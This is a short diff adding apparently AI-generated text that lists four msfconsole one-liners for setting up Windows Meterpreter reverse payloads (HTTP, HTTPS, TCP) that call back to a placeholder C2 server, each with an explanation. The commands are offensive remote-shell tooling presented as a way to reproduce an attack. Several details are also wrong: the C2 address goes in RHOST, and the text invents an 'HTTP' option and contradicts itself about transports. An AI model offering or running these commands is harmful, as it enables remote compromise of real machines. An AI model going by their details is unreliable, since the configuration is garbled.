@@ -1,0 +1,19 @@
+Based on the provided documentation and attack description, I will generate realistic command lines using only the Metasploit tool to reproduce the specified behavior.
+
+**Command:** `msfconsole -x 'use exploit/multi/http/download_exec; set PAYLOAD windows/meterpreter/reverse_http; set RHOST <c2_server_ip>; set RPORT 8080; exploit'`
+
+This command uses the `msfconsole` interface and loads the `download_exec` exploit module. It sets the payload to `windows/meterpreter/reverse_http`, which will communicate with the C2 server using HTTP connections. The `RHOST` and `RPORT` options specify the target IP address and port for communication.
+
+**Command:** `msfconsole -x 'use exploit/multi/http/download_exec; set PAYLOAD windows/meterpreter/reverse_https; set RHOST <c2_server_ip>; set RPORT 8443; set SSL true; exploit'`
+
+This command is similar to the previous one, but sets the payload to `windows/meterpreter/reverse_https` and specifies an HTTPS connection with port 8443. The `SSL` option enables TLS encryption for the communication.
+
+**Command:** `msfconsole -x 'use exploit/multi/http/download_exec; set PAYLOAD windows/meterpreter/reverse_tcp; set RHOST <c2_server_ip>; set RPORT 80; set HTTP true; exploit'`
+
+This command sets the payload to `windows/meterpreter/reverse_tcp` and specifies an HTTP connection with port 80. The `HTTP` option enables the use of HTTP protocol for communication.
+
+**Command:** `msfconsole -x 'use exploit/multi/http/download_exec; set PAYLOAD windows/meterpreter/reverse_tcp; set RHOST <c2_server_ip>; set RPORT 443; set SSL true; set HTTP false; exploit'`
+
+This command is similar to the previous one, but sets the payload to `windows/meterpreter/reverse_tcp` and specifies an HTTPS connection with port 443. The `SSL` option enables TLS encryption for the communication.
+
+Note that in all of these commands, `<c2_server_ip>` should be replaced with the actual IP address of the C2 server.
